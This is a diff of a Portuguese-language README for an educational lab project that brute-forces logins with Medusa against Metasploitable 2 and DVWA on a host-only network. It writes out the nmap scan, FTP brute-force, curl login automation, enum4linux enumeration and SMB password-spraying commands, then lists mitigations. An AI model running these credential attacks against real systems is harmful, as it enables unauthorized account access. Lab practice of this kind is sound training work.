@@ -1,87 +1,101 @@
-README - Projeto de Força Bruta com Medusa
+README – Projeto de Força Bruta com Medusa
 
 Este documento contém o README completo do projeto solicitado, incluindo:
-- Descrição do desafio
-- Objetivos
-- Ambiente configurado
-- Comandos utilizados
-- Cenários de ataque
-- Mitigações
-- Estrutura do repositório
 
+Descrição do desafio
 
-# Ataques de Força Bruta com Medusa em Ambiente Controlado
+Objetivos
 
-## Visão Geral  
+Ambiente configurado
+
+Comandos utilizados
+
+Cenários de ataque
+
+Mitigações
+
+Estrutura do repositório
+
+Como executar o script .sh
+
+Ataques de Força Bruta com Medusa em Ambiente Controlado
+Visão Geral
+
 Este projeto demonstra ataques de força bruta utilizando o Medusa no Kali Linux, explorando serviços vulneráveis no Metasploitable 2 e automação de ataques em aplicações web como a DVWA.
+Tudo realizado em ambiente controlado para fins educativos e de laboratório.
 
----
+Arquitetura do Ambiente
+Máquinas Virtuais
 
-## Arquitetura do Ambiente
+Kali Linux (atacante)
 
-### Máquinas Virtuais:
-- Kali Linux (atacante)
-- Metasploitable 2 (vítima)
-- DVWA
+Metasploitable 2 (vítima)
 
-### Rede:
-- Host-Only Adapter (VirtualBox)
-- IP identificado com: ip a
+DVWA instalada separadamente
 
----
+Configuração de Rede
 
-## Descoberta de Serviços
-Comando utilizado:
+Tipo: Host-Only Adapter (VirtualBox)
 
-    nmap -sV -p- 192.168.56.101
+Descobrir IP:
 
----
+ip a
 
-## 1) Ataque de Força Bruta FTP
+Descoberta de Serviços
+nmap -sV -p- 192.168.56.101
 
-Wordlist utilizada disponível neste projeto.
+1) Ataque de Força Bruta FTP
 
-Comando:
+Wordlist utilizada disponível no arquivo wordlist.txt deste projeto.
 
-    medusa -h 192.168.56.101 -u msfadmin -P wordlist.txt -M ftp
+medusa -h 192.168.56.101 -u msfadmin -P wordlist.txt -M ftp
 
----
+2) Ataque em Formulário Web DVWA
 
-## 2) Ataque em Formulário Web DVWA
+Automação base:
 
-Comando automatizado:
+curl -X POST -d "username=admin&password=PASS&Login=Login" URL
 
-    curl -X POST -d "username=admin&password=PASS&Login=Login" URL
+3) Password Spraying SMB
+Enumeração
+enum4linux -U 192.168.56.101
 
----
+Ataque
+medusa -h 192.168.56.101 -U users.txt -p "123456" -M smbnt
 
-## 3) Password Spraying SMB
+Mitigações
 
-Enumeração:
+Políticas de senha forte
 
-    enum4linux -U 192.168.56.101
+Time-out e bloqueio após tentativas erradas
 
-Ataque:
+Captcha em formulários
 
-    medusa -h 192.168.56.101 -U users.txt -p "123456" -M smbnt
+Fail2ban
 
----
+Redução da superfície de ataque
 
-## Mitigações
+Auditoria e monitoramento contínuo
 
-- Senhas fortes  
-- Bloqueio de tentativas  
-- Captcha  
-- Fail2ban  
-- Redução de superfície de ataque  
-
----
-
-## Estrutura do Repositório
-
-README.md  
-wordlist.txt  
-users.txt  
-bruteforce.sh  
+Estrutura do Repositório
+README.md
+wordlist.txt
+users.txt
+bruteforce.sh
 /images/*
 
+Como Executar o Script .sh
+
+Dê permissão de execução:
+
+chmod +x bruteforce.sh
+
+
+Execute:
+
+./bruteforce.sh
+
+
+Caso queira rodar especificando os arquivos:
+
+./bruteforce.sh wordlist.txt users.txt
